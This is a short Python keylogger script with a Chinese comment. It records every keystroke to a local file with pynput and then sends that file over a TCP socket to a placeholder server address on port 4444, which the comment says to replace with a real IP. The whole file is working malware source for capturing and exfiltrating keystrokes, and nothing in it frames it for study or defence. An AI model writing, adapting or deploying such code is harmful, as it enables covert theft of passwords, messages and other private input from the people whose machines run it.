from pynput.keyboard import Listener
import socket
def write_to_file(key):
    with open("log.txt", "a") as log_file:
        log_file.write(str(key))
def send_data(file_path):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("YOUR_SERVER_IP", 4444))  # 替换为实际的服务器IP和端口
    with open(file_path, "rb") as file:
        client.send(file.read())
    client.close()
with Listener(on_press=write_to_file) as listener:
    listener.join()
send_data("log.txt")
